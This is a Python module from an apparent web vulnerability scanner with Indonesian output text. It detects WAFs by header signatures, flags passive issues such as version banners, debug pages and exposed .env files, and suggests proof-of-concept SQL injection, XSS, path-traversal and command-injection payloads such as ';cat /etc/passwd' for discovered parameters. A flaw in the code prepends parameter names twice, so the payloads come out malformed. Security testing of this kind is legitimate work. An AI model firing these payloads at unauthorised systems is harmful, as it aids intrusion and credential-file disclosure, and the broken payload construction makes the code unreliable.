
import re
from typing import Dict, Any, List, Optional

# --- WAF Detection ---
def _detect_waf(headers: Dict) -> Optional[str]:
    waf_signatures = {
        "Cloudflare": ["server:cloudflare", "cf-ray", "cloudflare-nginx"],
        "Sucuri": ["server:sucuri/cloudproxy", "x-sucuri-cache", "x-sucuri-cloud"],
        "Incapsula": ["x-incapsula-reqid", "x-cdn:incapsula"],
        "Akamai": ["x-akamai-transformed", "x-akamai-request-id"],
        "ModSecurity": ["server:mod_security", "x-powered-by:mod_security"],
        "Wordfence": ["x-wf-po-nonce", "x-wordfence-cache"],
        "AWS WAF": ["x-amz-waf-id"],
        "F5 BIG-IP ASM": ["server:big-ip", "x-forwarded-for:.*(f5|bigip)"],
        "Barracuda WAF": ["x-barracuda-log-id"],
        "Imperva Incapsula": ["x-iinfo", "x-incapsula-proxy-id"],
        "Comodo WAF": ["server:comodo waf"],
        "Fastly": ["x-served-by:cache-", "x-cache:hit"], # Often used with WAFs
        "Google Cloud Armor": ["x-cloud-trace-context", "server:gfe"], # GFE is Google Front End, often with Cloud Armor
    }

    for waf_name, patterns in waf_signatures.items():
        for pattern in patterns:
            if ":" in pattern:
                header_name, header_value = pattern.split(":", 1)
                if header_name.lower() in headers and re.search(header_value, headers[header_name.lower()], re.IGNORECASE):
                    return waf_name
            elif pattern.lower() in headers.values():
                return waf_name
    return None

# --- PoC Payload Generation ---
def _generate_poc_payloads(parameter_name: str, param_type: str) -> Dict[str, List[str]]:
    payloads = {
        "SQL Injection": [
            f"'{parameter_name}=1' OR 1=1--",
            f"'{parameter_name}=1' UNION SELECT NULL,NULL,NULL--",
            f"'{parameter_name}=1' AND SLEEP(5)--",
        ],
        "XSS": [
            f"<{parameter_name}><script>alert(1)</script>",
            f"<{parameter_name}>''><script>alert(1)</script>",            f"<{parameter_name}>%3Cscript%3Ealert(1)%3C/script%3E",
        ],
        "Local File Inclusion (LFI)": [
            f"{parameter_name}=../../../../etc/passwd",
            f"{parameter_name}=../../../../windows/win.ini",
            f"{parameter_name}=file:///etc/passwd",
        ],
        "Remote Code Execution (RCE)": [
            f"{parameter_name}=;id",
            f"{parameter_name}=;cat /etc/passwd",
            f"{parameter_name}=%3Bid",
        ]
    }
    # Prepend parameter name to payloads for clarity
    formatted_payloads = {}
    for vuln_type, p_list in payloads.items():
        formatted_payloads[vuln_type] = [f"{parameter_name}={p}" for p in p_list]
    return formatted_payloads


async def analyze(response_text: str, response_headers: Dict, final_url: str, discovery_results: Optional[Dict] = None, discovered_parameters: Optional[Dict] = None) -> Dict[str, Any]:
    """Detects common vulnerability indicators, WAF, and generates PoC payloads."""
    indicators = []
    vulnerability_suggestions = []
    waf_info = {"detected": False, "name": None, "provider": None, "version": None, "ruleset": None, "notes": None}

    response_text_lower = response_text.lower()
    headers_lower = {k.lower(): v.lower() for k, v in response_headers.items()}

    # --- WAF Detection ---
    detected_waf = _detect_waf(headers_lower)
    if detected_waf:
        waf_info["detected"] = True
        waf_info["name"] = detected_waf
        # In a real scenario, you might have a WAF database to get more details
        # For now, we'll just set the name.
        indicators.append({
            'name': 'Deteksi WAF',
            'risk': 'Informasi',
            'description': f'Web Application Firewall (WAF) terdeteksi: {detected_waf}'
        })

    # --- Passive Checks ---
    # Server Information Disclosure
    server_header = headers_lower.get('server', '')
    if server_header and len(server_header) > 0 and any(server_type in server_header for server_type in ['apache', 'nginx', 'iis']):
        indicators.append({
            'name': 'Pengungkapan Informasi Server',
            'risk': 'Sedang',
            'description': f'Banner server mengungkapkan versi perangkat lunak: {server_header}'
        })

    # PHP Version Disclosure
    x_powered_by = headers_lower.get('x-powered-by', '')
    if 'php' in x_powered_by:
        indicators.append({
            'name': 'Pengungkapan Versi PHP',
            'risk': 'Sedang',
            'description': f'Versi PHP terekspos di header X-Powered-By: {x_powered_by}'
        })

    # Debug Mode Enabled (simplified check)
    if any(debug_pattern in response_text_lower for debug_pattern in ['debug=true', 'debug mode', 'development mode', 'stack trace']):
        indicators.append({
            'name': 'Mode Debug Diaktifkan atau Stack Trace Terekspos',
            'risk': 'Tinggi',
            'description': 'Aplikasi berjalan dalam mode debug/pengembangan atau stack trace terekspos'
        })

    # Directory Listing Enabled
    if 'index of /' in response_text_lower or 'parent directory' in response_text_lower:
        indicators.append({
            'name': 'Daftar Direktori Diaktifkan',
            'risk': 'Tinggi',
            'description': 'Daftar direktori diaktifkan, berpotensi mengekspos file sensitif'
        })

    # Deeper Error Messages Exposure
    error_patterns = [
        r'sql syntax error', r'mysql_fetch_array', r'pg_query', r'ORA-\d{5}', # SQL errors
        r'warning: ', r'fatal error', r'exception in', r'unhandled exception', # General application errors
        r'laravel.log', r'debugbar', r'whoops', # Framework specific debug info
        r'failed to open stream', r'include\(\)', r'require\(\)' # File inclusion hints
    ]
    for pattern in error_patterns:
        if re.search(pattern, response_text, re.IGNORECASE):
            indicators.append({
                'name': 'Eksposur Pesan Kesalahan Aplikasi/Database',
                'risk': 'Tinggi',
                'description': f'Pesan kesalahan yang berpotensi sensitif terdeteksi: {pattern}'
            })
            break # Only report one error message exposure for brevity

    # Information Disclosure from Sensitive Files (using discovery results)
    if discovery_results and discovery_results.get('found_files'):
        sensitive_file_patterns = [
            r'\.env', r'phpinfo\.php', r'config\.bak', r'backup\.zip', r'error_log'
        ]
        for found_file_url in discovery_results['found_files']:
            for pattern in sensitive_file_patterns:
                if re.search(pattern, found_file_url, re.IGNORECASE):
                    indicators.append({
                        'name': 'Pengungkapan Informasi dari File Sensitif',
                        'risk': 'Tinggi',
                        'description': f'File sensitif ditemukan: {found_file_url}'
                    })
                    break

    # Check response for common vulnerable patterns (existing checks)
    vuln_patterns = {
        'Potensi Pengalihan Terbuka (Open Redirect)': r'window\.location\s*=\s*[\"\"]' + re.escape(final_url.split('/')[2]) + r'[^\"\"]*\\?redirect=',
        'Petunjuk Injeksi SQL (SQL Injection Hint)': r'sql syntax|mysql_fetch|pg_query',
        'Panel Admin Terekspos': r'/admin|/login|/dashboard'
    }

    for vuln_type, pattern in vuln_patterns.items():
        if re.search(pattern, response_text, re.IGNORECASE):
            indicators.append({
                'name': vuln_type,
                'risk': 'Sedang',
                'description': f'Pola yang menunjukkan {vuln_type.lower()} terdeteksi dalam respons'
            })

    # --- PoC Payload Generation ---
    if discovered_parameters:
        for param_type, params in discovered_parameters.items():
            for param_name in params:
                poc_payloads = _generate_poc_payloads(param_name, param_type)
                for vuln_type, payloads in poc_payloads.items():
                    vulnerability_suggestions.append({
                        "type": vuln_type,
                        "description": f"Potensi kerentanan {vuln_type} pada parameter '{param_name}'",
                        "recommendation": f"Coba muatan berikut: {', '.join(payloads)}"
                    })

    return {"indicators": indicators, "waf_info": waf_info, "vulnerability_suggestions": vulnerability_suggestions}
